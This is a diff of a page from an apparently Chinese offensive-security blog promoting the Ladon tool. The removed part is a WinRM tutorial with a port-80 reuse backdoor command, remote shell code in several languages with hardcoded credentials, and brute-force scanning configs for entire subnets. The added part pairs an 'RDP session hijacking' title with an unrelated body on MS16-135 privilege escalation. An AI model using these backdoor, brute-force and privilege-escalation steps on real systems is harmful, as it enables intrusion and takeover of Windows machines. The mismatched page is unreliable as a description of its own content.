@@ -26,7 +26,7 @@
 
 
 
-简介WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理(WS-Management)标准，使用80端口或者443端口。这样一来，我...">
+漏洞介绍在微软Windows Vista SP2的内核模式驱动程序的Windows Server2008 R2 SP1,SP2,Windows 7 SP1,Windows 8.1,Wi...">
 
 
 <meta name="robots" content="all">
@@ -37,7 +37,7 @@
 
 <title>
     
-    Winrm远程命令/端口复用后门/WinrmCmd/密码爆破 |
+    〖教程〗RDP会话劫持-Ladon无密码登陆管理员桌面会话 |
     
     K8哥哥’s Blog
 </title>
@@ -153,7 +153,7 @@
     
     <article class="post">
     <h1 class="post-head">
-        Winrm远程命令/端口复用后门/WinrmCmd/密码爆破
+        〖教程〗RDP会话劫持-Ladon无密码登陆管理员桌面会话
     </h1>
     <div class="post-body">
         <p style="color:#fff;"> 
@@ -163,62 +163,25 @@ Visit <span id="busuanzi_value_page_pv"></span>
 %>
 </%></p>
 
-<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理(WS-Management)标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。</p>
-<p>Server2008R2及往上的系统中默认中都开启该服务，从Server2012系统后开始，该WinRM服务便被设置为默认开启。Win7系统中却默认安装此WinRM服务，但是默认为禁用状态，Win8系统和Win10系统也都默认开启WinRM服务。</p>
-<p>PS：WIN7或2008需要手动开户WINRM</p>
-<h3 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a>默认端口</h3><p>5985/tcp (HTTP)<br>5986/tcp (HTTPS)</p>
-<h3 id="快速启动WinRM"><a href="#快速启动WinRM" class="headerlink" title="快速启动WinRM"></a>快速启动WinRM</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm  quickconfig  -q 或 winrm qc</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>在微软Windows Vista SP2的内核模式驱动程序的Windows Server2008 R2 SP1,SP2,Windows 7 SP1,Windows 8.1,Windows Server 2012gold和R2,RT的Windows 8.1,Windows 10金,1511,和1607,Windows Server 2016允许本地用户获得特权,通过craftedapplication,又名“Win32K特权提升的漏洞。“</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>microsoft:windows_10:-</p>
+<p>microsoft:windows_10:1511</p>
+<p>microsoft:windows_10:1607</p>
+<p>microsoft:windows_7::sp1</p>
+<p>microsoft:windows_8.1</p>
+<p>microsoft:windows_rt_8.1</p>
+<p>microsoft:windows_server_2008::sp2</p>
+<p>microsoft:windows_server_2008:r2:sp1</p>
+<p>microsoft:windows_server_2012:-</p>
+<p>microsoft:windows_server_2012:r2</p>
+<p>microsoft:windows_server_2016</p>
+<p>microsoft:windows_vista::sp2</p>
+<h3 id="Ladon提权"><a href="#Ladon提权" class="headerlink" title="Ladon提权"></a>Ladon提权</h3><p>Ladon7.0集成该提权模块，ms16135参数版，无窗口且成功率高，原本提权过程中弹出窗口而且容易蓝屏。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ladon ms16135 cmdline</span><br><span class="line">CVE-2016-7255 | Windows Kernel - mode Driver / Win32k.sys</span><br><span class="line">Vulnerable: Vista/Win7/2008/Win8.1/2012/Win10/2016</span><br></pre></td></tr></table></figure>
 
-<h3 id="端口复用后门"><a href="#端口复用后门" class="headerlink" title="端口复用后门"></a>端口复用后门</h3><p>对于Windows Server 2012以上的服务器操作系统中，WinRM服务默认启动并监听了5985端口。<br>通过下面的命令，可以新增WinRM一个80端口的监听。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/service @&#123;EnableCompatibilityHttpListener=<span class="string">"true"</span>&#125;</span><br></pre></td></tr></table></figure>
-<p>PS：该方法适用于有web的机器，不会开启新端口，也不需要新的EXE进程或DLL劫持。</p>
-<h3 id="Winrs远程执行命令"><a href="#Winrs远程执行命令" class="headerlink" title="Winrs远程执行命令"></a>Winrs远程执行命令</h3><p>需要客户端启用Winrm，SYS权限受限制</p>
-<h4 id="客户端启用Winrm"><a href="#客户端启用Winrm" class="headerlink" title="客户端启用Winrm"></a>客户端启用Winrm</h4><p>winrm quickconfig -q<br>winrm set winrm/config/Client @{TrustedHosts=”*”}</p>
-<h4 id="远程执行CMD"><a href="#远程执行CMD" class="headerlink" title="远程执行CMD"></a>远程执行CMD</h4><p>通过Winrs连接，并执行whoami命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.1.20 -u:k8gege -p:k8gege520 whoami</span><br></pre></td></tr></table></figure>
-<p>通过Winrs连接，并获得交互式的shell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.1.20 -u:k8gege -p:k8gege520 cmd</span><br></pre></td></tr></table></figure>
-
-<h3 id="PowerShell远程执行命令"><a href="#PowerShell远程执行命令" class="headerlink" title="PowerShell远程执行命令"></a>PowerShell远程执行命令</h3><p>需要客户端启用Winrm，和系统自带命令一样,SYS权限受限制</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span>=<span class="string">"192.168.1.116"</span></span><br><span class="line"><span class="comment">#$ip="192.168.1.20"</span></span><br><span class="line"><span class="built_in">Set-Item</span> WSMan:\localhost\Client\TrustedHosts <span class="literal">-Value</span> <span class="variable">$ip</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$securePassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span> <span class="string">'k8gege520'</span> </span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="string">'k8gege'</span>, <span class="variable">$securePassword</span></span><br><span class="line"><span class="variable">$cmd</span> = &#123;ls C:\users\public&#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> <span class="variable">$ip</span> <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> <span class="variable">$cmd</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Pywinrm远程执行命令"><a href="#Pywinrm远程执行命令" class="headerlink" title="Pywinrm远程执行命令"></a>Pywinrm远程执行命令</h3><p>需要客户端启用Winrm，和系统自带命令一样,SYS权限受限制</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#C:\Users\null\Desktop\pywinrm&gt;python test1.py</span></span><br><span class="line"><span class="comment">#win-\k8gege</span></span><br><span class="line"><span class="keyword">import</span> winrm</span><br><span class="line">s=winrm.Session(<span class="string">'http://192.168.1.116'</span>,auth=(<span class="string">'k8gege'</span>,<span class="string">'k8gege520'</span>))<span class="comment">#2012 ok</span></span><br><span class="line"><span class="comment">#s=winrm.Session('http://192.168.1.20',auth=('k8gege','k8gege520'))#win7 fail</span></span><br><span class="line">r=s.run_ps(<span class="string">'dir'</span>)</span><br><span class="line">r=s.run_cmd(<span class="string">'whoami'</span>) </span><br><span class="line"><span class="keyword">print</span> r.std_out </span><br><span class="line"><span class="keyword">print</span>  r.std_err</span><br></pre></td></tr></table></figure>
-
-<h3 id="Gowinrm远程执行命令"><a href="#Gowinrm远程执行命令" class="headerlink" title="Gowinrm远程执行命令"></a>Gowinrm远程执行命令</h3><p>Go版不受权限限制，也不需要客户端启用Winrm，也不像系统自带winrs编码限制<br>推荐使用版本，跨平台，任意权限，工具无需系统客外配置，也无需复杂安装。</p>
-<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">"github.com/masterzen/winrm"</span></span><br><span class="line">  <span class="string">"fmt"</span></span><br><span class="line">  <span class="string">"os"</span></span><br><span class="line">  <span class="string">"strconv"</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//Winrm Remote Shell by k8gege</span></span><br><span class="line"><span class="comment">//http://k8gege.org/Ladon/WinrmScan.html</span></span><br><span class="line">#C:\Users\k8gege\Desktop\&gt;winrmcmd.exe <span class="number">192.168</span><span class="number">.1</span><span class="number">.116</span> <span class="number">5985</span> k8gege k8gege520 whoami</span><br><span class="line">#k8gege</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> help = <span class="function"><span class="keyword">func</span> <span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"Winrm Shell by k8gege"</span>)</span><br><span class="line">    fmt.Println(<span class="string">"===================================================="</span>)</span><br><span class="line">    fmt.Println(<span class="string">"winrmcmd host port user pass cmd"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	    args := os.Args</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) &lt; <span class="number">5</span> || args == <span class="literal">nil</span> &#123;</span><br><span class="line">		help()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">	host := args[<span class="number">1</span>]</span><br><span class="line">	port,err := strconv.Atoi(args[<span class="number">2</span>])</span><br><span class="line">	user := args[<span class="number">3</span>]</span><br><span class="line">	pass := args[<span class="number">4</span>]</span><br><span class="line">	cmd := args[<span class="number">5</span>]</span><br><span class="line">	</span><br><span class="line">	endpoint := winrm.NewEndpoint(host, port, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="number">0</span>)</span><br><span class="line">	client, err := winrm.NewClient(endpoint, user, pass)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">client.Run(cmd, os.Stdout, os.Stderr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="C-版远程执行命令"><a href="#C-版远程执行命令" class="headerlink" title="C#版远程执行命令"></a>C#版远程执行命令</h3><p>有两种方法，一种WSMAN，一种DCOM，都有缺限，一个在WIN7环境运行提示无效程序（在2012系统才正常）,另一个在WIN7开发环境正常在2012系统不能使用，再者需启用Winrm还一样受权限限制，还不如用系统自带命令好。</p>
-<h3 id="调用winrm爆破"><a href="#调用winrm爆破" class="headerlink" title="调用winrm爆破"></a>调用winrm爆破</h3><p>由于C#使用WSMan来访问winrm均在各种问题，还不如系统自带命令winrs。<br>当前机器为中文，目标为英文系统，连接提示编码问题，设置对应编码即可<br>其它语言系统，返回不一定是437，具体自行根据需要修改INI脚本。</p>
-<p>PS：GO版不受权限限制，也不受编码限制，建立使用GO版验证密码</p>
-<h5 id="WinrmScan-ini"><a href="#WinrmScan-ini" class="headerlink" title="WinrmScan.ini"></a>WinrmScan.ini</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line"><span class="comment">#Brute-Force WinRM</span></span><br><span class="line">exe=cmd.exe</span><br><span class="line">arg=/c <span class="string">"chcp 437 &amp; winrs -r:http://<span class="variable">$ip</span>$:5985 -u:<span class="variable">$user</span>$ -p:<span class="variable">$pass</span>$ "</span><span class="built_in">echo</span> isok<span class="string">""</span></span><br><span class="line"><span class="comment">#exe=WinrmScan.exe</span></span><br><span class="line"><span class="comment">#arg=$ip$ $user$ $pass$</span></span><br><span class="line">port=5985</span><br><span class="line">isok=isok</span><br><span class="line"><span class="built_in">log</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p>注意：INI脚本必须为ANSI编码，当前机器与目标必须启用WINRM，且放行5985端口<br>后门：如果被别人添加了复用后门，也可以直接爆破80端口，把5985改成80即可。</p>
-<h3 id="调用WinrmCmd爆破"><a href="#调用WinrmCmd爆破" class="headerlink" title="调用WinrmCmd爆破"></a>调用WinrmCmd爆破</h3><p>Go版不受权限限制，也不需要客户端启用Winrm，也不像系统自带winrs编码限制</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line"><span class="comment">#Brute-Force WinRM</span></span><br><span class="line">exe=winrmcmd.exe</span><br><span class="line">arg=<span class="variable">$ip</span>$ 5985 <span class="variable">$user</span>$ <span class="variable">$pass</span>$ <span class="string">"echo isok"</span><span class="string">"</span></span><br><span class="line"><span class="string">#exe=WinrmScan.exe</span></span><br><span class="line"><span class="string">#arg=<span class="variable">$ip</span>$ <span class="variable">$user</span>$ <span class="variable">$pass</span>$</span></span><br><span class="line"><span class="string">isok=isok</span></span><br><span class="line"><span class="string">log=true</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Winrm密码爆破-暴力破解"><a href="#Winrm密码爆破-暴力破解" class="headerlink" title="Winrm密码爆破/暴力破解"></a>Winrm密码爆破/暴力破解</h3><h4 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h4><p>INI脚本仅支持标准的user.txt和pass.txt帐密破解</p>
-<h5 id="user-amp-pass-传统帐密"><a href="#user-amp-pass-传统帐密" class="headerlink" title="user &amp; pass /传统帐密"></a>user &amp; pass /传统帐密</h5><p>user.txt<br>k8gege<br>root</p>
-<p>pass.txt<br>toor<br>k8gege520</p>
-<h4 id="指定IP"><a href="#指定IP" class="headerlink" title="指定IP"></a>指定IP</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8 WinrmScan.ini</span><br></pre></td></tr></table></figure>
-
-<h4 id="扫描C段"><a href="#扫描C段" class="headerlink" title="扫描C段"></a>扫描C段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/c WinrmScan.ini</span><br><span class="line">Ladon 192.168.1.8/24 WinrmScan.ini</span><br></pre></td></tr></table></figure>
-
-<h4 id="扫描B段"><a href="#扫描B段" class="headerlink" title="扫描B段"></a>扫描B段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/b WinrmScan.ini</span><br></pre></td></tr></table></figure>
-
-<h4 id="扫描A段"><a href="#扫描A段" class="headerlink" title="扫描A段"></a>扫描A段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/a WinrmScan.ini</span><br></pre></td></tr></table></figure>
-
-<h4 id="批量IP"><a href="#批量IP" class="headerlink" title="批量IP"></a>批量IP</h4><p>ip.txt<br>192.168.1.8<br>192.168.1.5<br>192.168.1.109:48</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon WinrmScan.ini</span><br></pre></td></tr></table></figure>
-
-<h4 id="批量C段"><a href="#批量C段" class="headerlink" title="批量C段"></a>批量C段</h4><p>ip24.txt<br>192.168.1.<br>10.1.5.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon WinrmScan.ini</span><br></pre></td></tr></table></figure>
-
-<h4 id="批量B段"><a href="#批量B段" class="headerlink" title="批量B段"></a>批量B段</h4><p>ip16.txt<br>192.168.<br>10.1.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon  WinrmScan.ini</span><br></pre></td></tr></table></figure>
-
-<p>如图，通过5985端口扫描1.20机器登陆口令<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/WinrmScan.PNG"></p>
-<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>WinrmCmd: <a href="https://github.com/k8gege/WinrmCmd" target="_blank" rel="noopener">https://github.com/k8gege/WinrmCmd</a></p>
+<p>PS：<br>1 原版：PowerShell成功率随缘，执行个10几20次才成功提权，还容易导致蓝屏<br>2 K8版：经过修改EXP运行比较稳定，基本上执行就能成功提权，成功率非常高。<br>3 仅支持64位系统</p>
+<h3 id="WIN10提权"><a href="#WIN10提权" class="headerlink" title="WIN10提权"></a>WIN10提权</h3><p>Ladon ms16135 whoami<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/ms16135.PNG"></p>
+<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 
     </div>
 </article>
